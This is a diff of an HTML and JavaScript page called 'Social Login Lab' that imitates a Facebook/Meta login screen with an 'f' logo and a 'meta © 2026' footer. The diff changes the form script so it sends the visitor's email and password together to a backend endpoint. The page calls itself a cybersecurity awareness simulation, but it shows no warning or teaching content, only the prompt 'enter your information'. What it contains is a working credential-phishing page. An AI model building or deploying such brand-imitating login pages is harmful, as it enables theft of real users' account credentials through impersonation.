@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,116 +10,107 @@
 
 <body>
 
-<div class="container">
+    <div class="container">
 
-    <div class="logo">
-        <span>f</span>
-    </div>
+        <div class="logo">
+            <span>f</span>
+        </div>
 
-    <h1>Social Login Lab</h1>
+        <h1>Social Login Lab</h1>
 
-    <p class="description">
-        Cybersecurity Awareness Simulation
-    </p>
-
-    <div class="login-box">
-
-        <h2>Welcome Back</h2>
-
-        <p>Enter your  information</p>
-
-        <form id="testForm">
-
-            <input
-                type="email"
-                id="email"
-                placeholder="Test email"
-                required
-            >
-
-            <input
-                type="password"
-                id="password"
-                placeholder=" password"
-                autocomplete="off"
-                required
-            >
-
-            <button type="submit" id="sendBtn">
-                Send
-            </button>
-
-        </form>
-
-        <p id="result"></p>
-
-        <div class="separator"></div>
-
-        <p class="warning">
-            enter your information
+        <p class="description">
+            Cybersecurity Awareness Simulation
         </p>
 
+        <div class="login-box">
+
+            <h2>Welcome Back</h2>
+
+            <p>Enter your information</p>
+
+            <form id="testForm">
+
+                <input type="email" id="email" placeholder="Test email" required>
+
+                <input type="password" id="password" placeholder=" password" autocomplete="off" required>
+
+                <button type="submit" id="sendBtn">
+                    Send
+                </button>
+
+            </form>
+
+            <p id="result"></p>
+
+            <div class="separator"></div>
+
+            <p class="warning">
+                enter your information
+            </p>
+
+        </div>
+
+        <footer>
+            meta © 2026
+        </footer>
+
     </div>
 
-    <footer>
-        meta © 2026
-    </footer>
+    <script>
+        const form = document.getElementById("testForm");
+        const result = document.getElementById("result");
+        const button = document.getElementById("sendBtn");
+        const passwordField = document.getElementById("password");
 
-</div>
+        form.addEventListener("submit", async function (e) {
 
-<script>
-const form = document.getElementById("testForm");
-const result = document.getElementById("result");
-const button = document.getElementById("sendBtn");
-const passwordField = document.getElementById("password");
+            e.preventDefault();
 
-form.addEventListener("submit", async function(e) {
-
-    e.preventDefault();
-
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
 
 
 
 
-    button.disabled = true;
-    button.textContent = "Sending...";
-    result.textContent = "";
+            button.disabled = true;
+            button.textContent = "Sending...";
+            result.textContent = "";
 
-    try {
+            try {
 
-        const response = await fetch("/api/send", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ email }),
+                const response = await fetch("/api/send", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
+                });
 
-            body:JSON.stringify({ password })
+                const data = await response.json();
+
+                result.textContent = data.message;
+                result.className = response.ok ? "success" : "error";
+
+                if (response.ok) {
+                    form.reset();
+                }
+
+            } catch (error) {
+
+                result.textContent = "Connection error. Try again.";
+                result.className = "error";
+
+            }
+
+            button.disabled = false;
+            button.textContent = "Send";
+
         });
-
-        const data = await response.json();
-
-        result.textContent = data.message;
-        result.className = response.ok ? "success" : "error";
-
-        if (response.ok) {
-            form.reset();
-        }
-
-    } catch (error) {
-
-        result.textContent = "Connection error. Try again.";
-        result.className = "error";
-
-    }
-
-    button.disabled = false;
-    button.textContent = "Send";
-
-});
-</script>
+    </script>
 
 </body>
+
 </html>
